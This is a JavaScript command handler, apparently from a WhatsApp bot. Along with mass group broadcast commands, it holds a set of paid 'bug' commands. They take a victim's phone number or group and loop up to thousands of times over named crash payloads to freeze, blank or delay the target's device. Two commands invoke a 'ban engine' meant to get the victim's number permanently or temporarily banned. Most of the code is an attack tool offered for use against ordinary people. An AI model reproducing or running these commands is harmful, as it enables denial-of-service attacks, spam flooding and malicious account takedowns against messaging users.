                for (let groupId of groupIds) {

                    if (global.db.jpmblacklist.includes(groupId)) {
                        continue;
                    }

                    try {
                        let members = [];
                        try {
                            const metadata = await aruloffcx.groupMetadata(groupId);
                            members = metadata.participants.map(p => p.id);
                        } catch (e) {
                            console.error(`Gagal ambil metadata grup ${groupId}:`, e);
                        }

                        let messagePayload;
                        if (mediaType === "image" && mediaFile) {
                            messagePayload = {
                                image: fs.readFileSync(mediaFile),
                                caption: messageText,
                                mentions: members
                            };
                        } else if (mediaType === "video" && mediaFile) {
                            messagePayload = {
                                video: fs.readFileSync(mediaFile),
                                caption: messageText,
                                mentions: members
                            };
                        } else {
                            messagePayload = {
                                text: messageText,
                                mentions: members
                            };
                        }

                        await aruloffcx.sendMessage(groupId, messagePayload, { quoted: qchannel });
                        successCount++;
                    } catch (error) {
                        console.error(`Gagal kirim ke ${groupId}:`, error.message);
                        failedCount++;
                    }

                    await new Promise(resolve => setTimeout(resolve, 3000));
                }

                if (mediaFile && fs.existsSync(mediaFile)) {
                    try {
                        fs.unlinkSync(mediaFile);
                    } catch (e) {
                        console.error("Gagal hapus file media:", e);
                    }
                }

                await zreply(`*LAPORAN JPM HT SUKSES* ✅\n\n` +
                    `▸ Tipe: ${mediaType} dengan mention\n` +
                    `▸ Berhasil: ${successCount} grup\n` +
                    `▸ Gagal: ${failedCount} grup\n` +
                    `▸ Blacklist: ${global.db.jpmblacklist.length} grup`);
            }
                break;

            // CASE BL JPM
            case "blokjpm":
            case "matijpm":
            case "addbl": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (!isGroup) return zreply(`*this is for groups only*`);

                if (!global.db) global.db = {};
                if (!global.db.jpmblacklist) global.db.jpmblacklist = [];

                const groupId = m.chat;

                if (global.db.jpmblacklist.includes(groupId)) {
                    return zreply(`❌ Grup ini sudah ada di blacklist JPM!`);
                }

                global.db.jpmblacklist.push(groupId);

                let groupName = "Unknown Group";
                try {
                    const metadata = await aruloffcx.groupMetadata(groupId);
                    groupName = metadata.subject || groupId;
                } catch (e) {
                    console.error("Gagal ambil nama grup:", e);
                }

                await zreply(`*Grup ini berhasil diblokir dari JPM*`);

                try {
                    fs.writeFileSync(path.join(__dirname, '../gudang/database/jpmblacklist.json'), JSON.stringify(global.db.jpmblacklist, null, 2));
                } catch (e) {
                    console.error("Gagal simpan blacklist ke file:", e);
                }
            }
                break;

            // CASE DEL BL JPM
            case "buka":
            case "delbl":
            case "unblockjpm": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (!isGroup) return zreply(`*this is for groups only*`);

                if (!global.db) global.db = {};
                if (!global.db.jpmblacklist) global.db.jpmblacklist = [];

                const groupId = m.chat;

                const index = global.db.jpmblacklist.indexOf(groupId);
                if (index === -1) {
                    return zreply(`❌ Grup ini tidak ada di blacklist JPM!`);
                }

                global.db.jpmblacklist.splice(index, 1);

                let groupName = "Unknown Group";
                try {
                    const metadata = await aruloffcx.groupMetadata(groupId);
                    groupName = metadata.subject || groupId;
                } catch (e) {
                    console.error("Gagal ambil nama grup:", e);
                }

                await zreply(`*Grup berhasil dibuka dari blacklist JPM*`);

                try {
                    fs.writeFileSync(path.join(__dirname, '../gudang/database/jpmblacklist.json'), JSON.stringify(global.db.jpmblacklist, null, 2));
                } catch (e) {
                    console.error("Gagal simpan blacklist ke file:", e);
                }
            }
                break;

            // BUG COMMAND
            case 'oneterm':
            case 'elmionemsg': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Contoh: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';
                const BlockNum = '6285814233961@s.whatsapp.net';

                if (target === BlockNum) return zreply("*no you will send this to the developer*");

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                // Execute exploit
                for (let i = 0; i < 5; i++) {
                    await FcOneMesYgy(aruloffcx, target);
                    await sleep(100);
                }

                // CORTANA Success Message
                await cortanaExploitSuccess(bijipler, command);
                break;
            }
            case 'trashem':
            case 'elmitrash': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Contoh: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';
                const BlockNum = '6285814233961@s.whatsapp.net';

                if (target === BlockNum) return zreply("*no you will send this to the developer*");

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                // Execute exploit
                for (let i = 0; i < 5; i++) {
                    await ElmiForceMsgV1(aruloffcx, target);
                    await sleep(100);
                }

                // CORTANA Success Message
                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            case 'cortanacall':
            case 'elmicall': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Contoh: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';
                const BlockNum = '6285814233961@s.whatsapp.net';

                if (target === BlockNum) return zreply("*no you will send this to the developer*");

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                // Execute exploit
                for (let i = 0; i < 800; i++) {
                    await ElmiForceV1(aruloffcx, target);
                    await sleep(1500);
                    await ElmiForceV1(aruloffcx, target);
                    await sleep(1500);
                    await ElmiForceV1(aruloffcx, target);
                    await sleep(1500);
                }

                // CORTANA Success Message
                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // CRASH HOME BUG (X-CRASH)
            case 'newyear':
            case 'elmixcrash': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Contoh: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';
                const BlockNum = '6285814233961@s.whatsapp.net';

                if (target === BlockNum) return zreply("*no you will send this to the developer*");

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                // Execute exploit
                for (let i = 0; i < 1000; i++) {
                    await SpcmUi(aruloffcx, target);
                    await sleep(1500);
                    await BlankSpam(aruloffcx, target);
                    await sleep(1500);
                    await BugGb12(aruloffcx, target);
                    await sleep(1500);
                    await ElmiForceV1(aruloffcx, target);
                    await sleep(1500);
                }

                // CORTANA Success Message
                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // DEVICE CRASH (BLANKING)
            case 'cortana-blank':
            case 'elmiblanking':
            case 'edudevice':
            case 'elmidevice':
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Contoh: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';
                const BlockNum = '6285814233961@s.whatsapp.net';

                if (target === BlockNum) return zreply("*no you will send this to the developer*");

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                // Execute exploit
                for (let i = 0; i < 1000; i++) {
                    await BugGb12(aruloffcx, target);
                    await sleep(1500);
                    await SpcmUi(aruloffcx, target);
                    await sleep(1500);
                    await BlankSpam(aruloffcx, target);
                    await sleep(1500);
                    await SpcmUi(aruloffcx, target);
                    await sleep(1500);
                }

                // CORTANA Success Message
                await cortanaExploitSuccess(bijipler, command);
                break;
        }


        if (!isPremium && !isCreator) {
            return zreply(`*no, this is for premium only*`);
        }

        if (!text) {
            return zreply(`— example: ${prefix + command} 62xxx`);
        }

        let bijipler = text.replace(/[^0-9]/g, '');
        if (bijipler.startsWith('0')) {
            return zreply(`Contoh: ${prefix + command} 628xxx`);
        }

        let target = bijipler + '@s.whatsapp.net';
        const BlockNum = '6285814233961@s.whatsapp.net';

        if (target === BlockNum) return zreply("*no you will send this to the developer*");

        await reaction(m.chat, "🦠");
        await sleep(550);
        await reaction(m.chat, "☠️");
        await sleep(550);
        await reaction(m.chat, "🩸");
        await sleep(550);
        await reaction(m.chat, "🐉");
        await sleep(550);
        await reaction(m.chat, "✅");

        const done = `\`[ 𝐒𝐔𝐂̸͜𝐂̸͜𝐄𝐒 𝐄͡͡𝐗𝐄𝐂̸͜𝐔𝐓𝐈𝐎̽͢𝐍 ]\`
\`𖥂\` Target : ${bijipler}
\`𖥂\` Status : Done Bang
\`𖥂\` Type : Delay Hard Invisible
\`𖥂\` Command : ${command}`;

        await aruloffcx.sendMessage(m.chat, {
            interactiveMessage: {
                title: done,
                footer: '( ! ) Abis Bug Kasih Jeda 10 Menit',
                thumbnail: "https://files.catbox.moe/r06wjz.jpeg",
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "single_select",
                            buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                        },
                        {
                            name: "call_permission_request",
                            buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                        },
                        {
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                                display_text: "𝐈𝐧𝐟𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭",
                                url: "https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M"
                            })
                        }
                    ]
                }
            }
        },
            {
                quoted: {
                    key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
                    message: {
                        requestPaymentMessage: {
                            currencyCodeIso4217: "USD",
                            amount1000: "999999999",
                            requestFrom: "0@s.whatsapp.net",
                            noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
                            expiryTimestamp: "999999999",
                            amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
                        }
                    }
                }
            });

        for (let i = 0; i < 1000; i++) {
            await TzXAudio(aruloffcx, target);
            await sleep(1500);
            await TzXAudio(aruloffcx, target);
            await sleep(1500);
            await TzXAudio(aruloffcx, target);
            await sleep(1500);
            await TzXAudio(aruloffcx, target);
            await sleep(1500);
        }

        break;
    }

            // DELAY HARD BUG
            case 'cortanazap':
            case 'zeroreturn':
            case 'elmizap':
            case 'elmitravas':
            case 'kindiki':
            case 'elmighost': {
        if (!isPremium && !isCreator) {
            return zreply(`*no, this is for premium only*`);
        }

        if (!text) {
            return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
        }

        let bijipler = text.replace(/[^0-9]/g, '');
        if (bijipler.startsWith('0')) {
            return zreply(`Contoh: ${prefix + command} 628xxx`);
        }

        let target = bijipler + '@s.whatsapp.net';
        const BlockNum = '6285814233961@s.whatsapp.net';

        if (target === BlockNum) return zreply("*no you will send this to the developer*");

        await reaction(m.chat, "🦠");
        await sleep(400);
        await reaction(m.chat, "☠️");
        await sleep(400);
        await reaction(m.chat, "✅");

        // Execute exploit
        for (let i = 0; i < 800; i++) {
            await TzXAudio(aruloffcx, target);
            await sleep(1500);
            await TzXAudio(aruloffcx, target);
            await sleep(1500);
            await TzXAudio(aruloffcx, target);
            await sleep(1500);
        }

        // CORTANA Success Message
        await cortanaExploitSuccess(bijipler, command);
        break;
    }

            // GROUP BUG
            case 'kufeni':
            case 'kanjut': {
        if (!m.isGroup) return zreply(`*this is for groups only*`)
        if (!isCreator) return zreply(`*no, this is for owners only*`)

        await reaction(m.chat, "🦠");
        await sleep(400);
        await reaction(m.chat, "☠️");
        await sleep(400);
        await reaction(m.chat, "✅");

        const target = m.chat;
        await R9XKillGc(aruloffcx, target, false);

        // CORTANA Success Message
        await cortanaExploitSuccess(m.chat.split('@')[0], command);
        break;
    }

            case 'cookall':
            case 'maklo':
            case 'fuckgc':
            case 'tobrut': {
        if (!m.isGroup) return zreply(`*this is for groups only*`)
        if (!isCreator) return zreply(`*no, this is for owners only*`)

        await reaction(m.chat, "🦠");
        await sleep(400);
        await reaction(m.chat, "☠️");
        await sleep(400);
        await reaction(m.chat, "✅");

        for (let i = 0; i < 1000; i++) {
            await BugGb12(aruloffcx, m.chat)
            await BugGb12(aruloffcx, m.chat)
            await BugGb12(aruloffcx, m.chat)
            await BugGb12(aruloffcx, m.chat)
            await BugGb12(aruloffcx, m.chat)
            await BugGb12(aruloffcx, m.chat)
            await BugGb12(aruloffcx, m.chat)
            await BugGb12(aruloffcx, m.chat)
            await sleep(1000)
        }

        // CORTANA Success Message
        await cortanaExploitSuccess(m.chat.split('@')[0], command);
        break;
    }

            // ═══════ BAN EXPLOITS ═══════
            case 'perm-ban-num': {
        if (!isCreator) return zreply(`*no, this is for owners only*`);

        if (!text) {
            return zreply(`— example: ${prefix + command} 62xxx`);
        }

        let bijipler = text.replace(/[^0-9]/g, '');
        if (bijipler.startsWith('0')) {
            return zreply(`Format: ${prefix + command} 628xxx`);
        }

        let target = bijipler + '@s.whatsapp.net';

        await reaction(m.chat, "🦠");
        await sleep(400);
        await reaction(m.chat, "☠️");
        await sleep(400);
        await reaction(m.chat, "🔥");

        try {
            // Import and execute ban engine
            const { CortanaDoomsday } = require(path.join(__dirname, '../../ban-engine'));
            const banEngine = new CortanaDoomsday();

            // Send starting message
            await aruloffcx.sendMessage(m.chat, {
                text: `☠️ *CORTANA PERMANENT BAN*\n\n🎯 Target: ${bijipler}\n⏳ Status: Initializing doomsday engine...\n\nThis may take several minutes.`
            });

            // Execute permanent ban
            const result = await banEngine.executePermanentBan(target);

            await reaction(m.chat, "✅");

            // CORTANA Ban Success Message
            await cortanaBanSuccess(bijipler, command);

        } catch (error) {
            console.error('[BAN] Error:', error);
            await reaction(m.chat, "❌");
            zreply(`*Ban execution failed: ${error.message}*`);
        }

        break;
    }

            case 'temp-ban-num': {
        if (!isCreator) return zreply(`*no, this is for owners only*`);

        if (!text) {
            return zreply(`— example: ${prefix + command} 62xxx`);
        }

        let bijipler = text.replace(/[^0-9]/g, '');
        if (bijipler.startsWith('0')) {
            return zreply(`Format: ${prefix + command} 628xxx`);
        }

        let target = bijipler + '@s.whatsapp.net';

        await reaction(m.chat, "🦠");
        await sleep(400);
        await reaction(m.chat, "☠️");
        await sleep(400);
        await reaction(m.chat, "⚡");

        try {
            // Import and execute ban engine
            const { CortanaDoomsday } = require(path.join(__dirname, '../../ban-engine'));
            const banEngine = new CortanaDoomsday();

            // Send starting message
            await aruloffcx.sendMessage(m.chat, {
                text: `☠️ *CORTANA TEMPORARY BAN*\n\n🎯 Target: ${bijipler}\n⏳ Status: Initializing attack...\n\nThis may take a few minutes.`
            });

            // Execute temporary ban (HEAVY intensity)
            const result = await banEngine.executeTemporaryBan(target);

            await reaction(m.chat, "✅");

            // CORTANA Ban Success Message
            await cortanaBanSuccess(bijipler, command);

        } catch (error) {
            console.error('[BAN] Error:', error);
            await reaction(m.chat, "❌");
            zreply(`*Ban execution failed: ${error.message}*`);
        }

        break;
    }

            default:
    const pluginsDisable = true;
    if (!pluginsDisable) {
        // Fungsi untuk memuat plugins
        const pluginsLoader = async (directory) => {
            let plugins = [];
            try {
                const files = fs.readdirSync(directory);
                for (const file of files) {
                    const filePath = path.join(directory, file);
                    if (filePath.endsWith(".js")) {
                        try {
                            const resolvedPath = require.resolve(filePath);
                            if (require.cache[resolvedPath]) {
                                delete require.cache[resolvedPath];
                            }
                            const plugin = require(filePath);
                            plugins.push(plugin);
                        } catch (error) {
                            console.log(`Error loading ${filePath}:`, error.message);
                        }
                    }
                }
            } catch (error) {
                console.log("Error loading plugins:", error.message);
            }
            return plugins;
        };

        const plugins = await pluginsLoader(path.resolve(__dirname, "../command"));
        const plug = {
            aruloffc,
            prefix,
            command,
            Reply,
            text,
            isBot,
            reaction,
            pushname,
            mime,
            quoted,
            sleep: sleep || ((ms) => new Promise(resolve => setTimeout(resolve, ms))),
            fquoted,
            fetchJson
        };

        for (let plugin of plugins) {
            if (plugin.command && plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.isBot && !isBot) {
                    return;
                }

                if (plugin.private && !plug.isPrivate) {
                    return zreply(config.message?.private || "Fitur ini bersifat private!");
                }

                if (typeof plugin !== "function") return;
                await plugin(m, plug);
            }
        }
    }
    break;
}
    } catch (err) {
    console.error("Error in main handler:", util.format(err));
}
};

const file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file];
    require(file);
});